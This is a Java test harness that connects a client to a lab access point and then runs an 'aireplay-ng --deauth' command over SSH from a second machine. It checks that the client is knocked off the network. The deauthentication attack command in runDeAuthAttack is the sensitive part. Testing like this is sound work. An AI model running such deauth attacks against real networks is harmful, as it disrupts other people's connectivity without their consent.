package experiments;

import utils.Utilities;
import wifi.SSHClientRemote;
import wifi.WIFIManager;

import java.time.Duration;
import java.time.Instant;
import data.Credentials;
import data.TestData;

import static data.TestData.*;

public class Tests
{
    // TODO: Use Awaitability
    public static Boolean WaitForClientDisconnected(WIFIManager mgr,
                                                    SSHClientRemote sshClient)
    {
        /*
        if (!sshClient.isClientConnected(clientMAC, cslWiFiInterface))  {
            System.err.println("Client " + clientMAC + " is not connected.");
            return false;
        }
        */

        final Instant start = Instant.now();
        final long timeoutSeconds = 10;
        while (timeoutSeconds >= Duration.between(start, Instant.now()).getSeconds())
        {
            if (!sshClient.isClientConnected(clientMAC, cslWiFiInterface))  {
                System.err.println("Client " + clientMAC + " has been disconnected. OK");
                return true;
            }
            Utilities.sleep(50);
        }

        System.err.println("FAILURE: Client " + clientMAC + " is still connected. " + timeoutSeconds + " has passed.");
        return false;
    }

    public static Boolean ConnectToCSLWiFiAccessPointRemote(SSHClientRemote sshClient)
    {
        // TODO: Logging
        System.out.println("Connecting from " + clientMAC + " to " + cslWiFiAPName);

        if (!sshClient.CheckIsConnectedToAccessPoint(clientWiFiInterface, cslWiFiAPName))
        {
            System.err.println("Not connected now. Connecting.....");

            if (!sshClient.ConnectToWiFiAccessPoint(cslWiFiAPName, cslWiFiAPPassword)) {
                System.err.println("Failed to connect to '" + cslWiFiAPName + "' Access Point");
                return false;
            }
        }

        if (!sshClient.CheckIsConnectedToAccessPoint(clientWiFiInterface, cslWiFiAPName)) {
            System.err.println("Client is still not connected to '" + cslWiFiAPName + "' Access Point");
            return false;
        }

        if (!sshClient.isClientConnected(clientMAC, cslWiFiInterface))  {
            System.err.println("Client " + clientMAC + " is not connected to CSL at '" + cslWiFiInterface + "'");
            return false;
        }
        return true;
    }

    public static Boolean ConnectToCSLWiFiAccessPoint(WIFIManager mgr,
                                                      SSHClientRemote sshClient)
    {
        // TODO: Logging
        System.out.println("Connecting from " + clientMAC + " to " + cslWiFiAPName);

        if (!mgr.CheckIsConnectedToAccessPoint(clientWiFiInterface, cslWiFiAPName))
        {
            System.out.println("Not connected now. Connecting.....");
            if (!mgr.ConnectToWiFiAccessPoint(cslWiFiAPName, cslWiFiAPPassword)) {
                System.err.println("Failed to connect to '" + cslWiFiAPName + "' Access Point");
                return false;
            }
        }

        if (!mgr.CheckIsConnectedToAccessPoint(clientWiFiInterface, cslWiFiAPName)) {
            System.err.println("Client is still not connected to '" + cslWiFiAPName + "' Access Point");
            return false;
        }
        System.out.println("Client connected to '" + cslWiFiAPName + "'");

        if (!sshClient.isClientConnected(clientMAC, cslWiFiInterface))  {
            System.err.println("Client " + clientMAC + " is not connected to CSL at '" + cslWiFiInterface + "'");
            return false;
        }
        System.out.println("Client '" + clientMAC + "' is connected. (From the CSL side)");

        return true;
    }

    public static Boolean runDeAuthAttack(SSHClientRemote sshClient)
    {
        try {
            String cmd = "aireplay-ng --deauth 1 -a " + cslWiFiMac + " -c " + clientMAC + " " + monitorWiFiInterface;
            String result = sshClient.execCommand(cmd);
            return result.contains("Sending") && result.contains("directed DeAuth");
        } catch (Exception exc) {
            exc.printStackTrace(); // TODO: Handle exception
            return false;
        }
    }


    public static void Check_IsClientConnected()
    {
        final SSHClientRemote cslClient = new SSHClientRemote(Credentials.CSL_USER,
                Credentials.CSL_USER, Credentials.CSL_HOST);

        final String max4Mac = "18:f0:e4:1f:b2:84";
        final Boolean result = cslClient.isClientConnected(max4Mac, cslWiFiInterface);

        System.out.println(result);

    }

    public static void FullTest()
    {
        System.out.println("0. Starting test");
        SSHClientRemote cslClient = new SSHClientRemote(Credentials.CSL_USER, Credentials.CSL_USER, Credentials.CSL_HOST);
        SSHClientRemote clientLaptopSecond = new SSHClientRemote(Credentials.ROOT_USER, Credentials.PASSWORD, Credentials.HOST_T14_SECOND);
        WIFIManager mgr = new WIFIManager();


        System.out.println("1. Establish the WiFi connected with CSL AccessPoint");
        if (!ConnectToCSLWiFiAccessPoint(mgr, cslClient)) {
            System.err.println("Failed to establish WiFi connection with CSL");
            return;
        }

        //sleep(5000);

        System.out.println("2. Running Auth attack");
        if (!runDeAuthAttack(clientLaptopSecond)) {
            System.err.println("Failed to run DeAuth attack");
            return;
        }

        System.out.println("3. Checking that client has been disconnected");
        if (!WaitForClientDisconnected(mgr, cslClient)) {
            System.err.println("Postconditions check failed");
            return;
        }
        // TODO: Check Disconnection local

        System.out.println("OK. Test passed");
    }

    public static void main(String[] args)
    {
        // Check_IsClientConnected();
        FullTest();
    }
}
